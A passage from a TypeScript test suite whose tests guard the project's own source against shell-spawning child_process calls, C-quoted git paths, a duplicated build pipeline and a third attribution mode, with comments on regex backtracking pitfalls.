   * an import list cannot see — a `shell:` option on an otherwise allowed
   * `execFile`, and an argv a reviewer cannot read on the spot.
   *
   * The shell option is matched as "anything that is not `false`", NOT as
   * `shell: true`, and that is the difference between a guard and a
   * decoration. `execFile(file, args, { shell: "/bin/sh" })` runs the argv
   * through a shell exactly as `shell: true` does — it is the documented way
   * to name WHICH shell — and a `true`-anchored pattern waved it through, as
   * it did `shell: process.env.SHELL`. Both are the shape the one plausible
   * edit here takes ("Windows can't find `uv` without a shell"), and both
   * were invisible to this guard while its own name claimed to cover them.
   * String literals are stripped before the match, so the `"/bin/sh"` case
   * arrives as `shell: ""` — matched by "not `false`", missed by any pattern
   * that tries to enumerate the values a shell can be spelled with.
   *
   * Not baked into `usesUnsafeSpawn` itself: comment/string stripping, same
   * split as `isChecklistRegex` above — the function is a plain regex test,
   * and callers choose whether to strip first.
   */
  function usesUnsafeSpawn(text: string): boolean {
    return (
      /\bchild_process\.exec\s*\(/.test(text) ||
      // The whitespace lives INSIDE the lookahead (`(?!\s*false\b)`), never
      // as a `\s*` in front of it — the identical backtracking trap the
      // spawn-argv comment below documents, and it bit here too: with
      // `\s*(?!false\b)`, `shell: false` matched, because `\s*` gave back
      // the space so the assertion ran at the space instead of at `false`.
      /\bshell\s*:(?!\s*false\b)/.test(text) ||
      // The lookahead skips whitespace INSIDE itself (`(?!\s*\[)`), not via
      // a `\s*` sitting outside it — a `,\s*(?!\[)` spelling let `\s*`
      // backtrack to zero characters so the assertion ran against the space
      // itself rather than the `[` after it, and `spawn(file, ['a', 'b'])`
      // (a literal array, perfectly legal) matched as a violation.
      /\bspawn\s*\(\s*[^,\n]+,(?!\s*\[)/.test(text)
    );
  }

  it("never gives a child_process module a shell-spawning primitive — child_process.exec(, shell: true, or a non-literal spawn argv", () => {
    // Every module that can spawn at all, not `setup-io.ts` alone: a
    // `shell: true` in `harvest.ts`'s `execFileSync("git", args, {…})` runs
    // the same argv through `/bin/sh`, and the rule is about the primitive,
    // not about which file happens to be user-facing.
    const offenders = CHILD_PROCESS_MODULES.filter((f) => usesUnsafeSpawn(code(f)));
    expect(offenders).toEqual([]);
  });

  /** The guard above is a regex, so what it can see is a claim of its own,
   *  and one nothing exercises now that the tree has no offenders. Pin the
   *  spellings it must catch and the ones it must not — same shape as every
   *  other paired test in this file. */
  it("recognises every spelling of an unsafe spawn, and no unrelated call", () => {
    const violatesGuard = (text: string): boolean => usesUnsafeSpawn(stripped(text));
    for (const violation of [
      "child_process.exec(cmd);",
      "child_process.exec(cmd, cb);",
      "spawn(file, args, { shell: true });",
      "execFile(file, args, { shell: true });",
      "const opts = { shell: true }; spawn(file, argv, opts);",
      "spawn(file, argv);",
      "child_process.spawn(cmd, userArgs);",
      // A shell named rather than switched on — the same shell, and the
      // spelling a `shell: true` pattern let straight through.
      'execFile(file, args, { shell: "/bin/sh" });',
      'execFileSync("git", args, { cwd, shell: "/bin/bash" });',
      "execFile(file, args, { shell: process.env.SHELL });",
      "spawn(file, ['a'], { shell: shellPath });",
    ]) {
      expect([violation, violatesGuard(violation)]).toEqual([violation, true]);
    }
    for (const legal of [
      "execFile(file, args);",
      "execFileAsync(file, args);",
      "spawn(file, ['a', 'b']);",
      "spawn(file, [...args]);",
      "// never child_process.exec( or shell: true",
      "const shell = false;",
      // Explicitly opting OUT of a shell is the safe spelling, not a
      // violation — the rule is "no shell", not "no mention of one".
      "execFile(file, args, { shell: false });",
      "spawn(file, ['a'], { cwd, shell: false });",
    ]) {
      expect([legal, violatesGuard(legal)]).toEqual([legal, false]);
    }
  });

  /**
   * A twelfth single-spelling rule: `setup.ts`'s build step calls the SAME
   * `analyze -> renderMap -> writeArtifact` sequence `octograph map` runs,
   * through `runMapCommand` (cli.ts) — never a second, hand-assembled copy
   * of that pipeline. A second copy of exactly this shape (one rule,
   * expressed twice, free to drift) is the `entity-io.mjs` vs
   * `entity-schema.ts` defect this whole tool exists to detect; shipping one
   * inside the tool itself would be the sharpest possible irony.
   */
  it("setup.ts calls the shared build pipeline through runMapCommand — never analyze/renderMap/writeArtifact directly", () => {
    expect(/\banalyze\(|\brenderMap\(|\bwriteArtifact\(/.test(code("setup.ts"))).toBe(false);
  });

  /**
   * A ninth single-spelling rule, and the first one this suite pins by
   * EXACT membership rather than "at least contains": `AttributionMode` must
   * have exactly two members, `"provenance"` and `"predicted"`, and no third.
   *
   * An earlier draft of the M4 plan proposed a third `inferred` mode that
   * would scan squash-merge commit subjects for task ids. Measuring killed
   * it: `gh pr list --state merged --json headRefName,mergeCommit` recovers
   * every merged PR's merge SHA permanently, including for branches
   * `--delete-branch` already removed, so the branch-name-convention
   * inference a third mode would have re-invented is unnecessary — and
   * lossy (T2.1, on this repo, has no commit subject carrying its id). A
   * blurred third mode is invisible behaviourally on fixtures built for two
   * modes, the same argument the `edgeWeight`/`compare` guards above rest
   * on — only the source distinguishes "exactly two" from "two, so far".
   */
  /**
   * A tenth single-spelling rule: **every** reader that asks git for file
   * names passes `-z`.
   *
   * Without it git applies `core.quotePath` and hands back a C-quoted
   * rendering — `src/résumé.ts` arrives as `"src/r\303\251sum\303\251.ts"`,
   * quotes and octal escapes included. That is not a path on disk, so the two
   * readers disagree about the same file's name: `harvest` (which passes
   * `-z`) names the node `src/résumé.ts` while a reader that omits it claims
   * provenance over `"src/r\303\251sum\303\251.ts"`, a phantom that matches
   * nothing. `attribution.ts` shipped exactly that, in the same package whose
   * `harvest.ts` already carried a comment explaining why not to.
   *
   * Invisible on any ASCII fixture, which is every fixture this suite builds
   * by default — so it is guarded at the source, like the rules above.
   */
  it("passes -z wherever it asks git for file names, so no reader gets C-quoted paths", () => {
    // Comments only: `code()` strips string literals, which are the very
    // argv tokens this rule is about.
    const argv = (f: string) =>
      readFileSync(join(SRC, f), "utf8")
        .replace(/\/\*[\s\S]*?\*\//g, " ")
        .replace(/\/\/[^\n]*/g, " ");
    const offenders = sources.filter((f) => {
      const text = argv(f);
      return /["']--name-only["']/.test(text) && !/["']-z["']/.test(text);
    });
    expect(offenders).toEqual([]);
  });

  it("gives AttributionMode exactly two members — no third mode for commit-subject scanning", () => {
    // `code()` strips string literals too, which would erase the very
    // members this guard reads — comments only, same as the graphify-path
    // and board-directory guards above, which read a literal for the same
    // reason.
    const withoutComments = readFileSync(join(SRC, "attribution.ts"), "utf8")
      .replace(/\/\*[\s\S]*?\*\//g, " ")
      .replace(/\/\/[^\n]*/g, " ");
    const m = /type AttributionMode\s*=\s*("[^"]+"(?:\s*\|\s*"[^"]+")*)/.exec(withoutComments);
    expect(m).not.toBeNull();
    const members = (m ? m[1] : "").split("|").map((s) => s.trim());
    expect(members.sort()).toEqual(['"predicted"', '"provenance"']);
  });
});
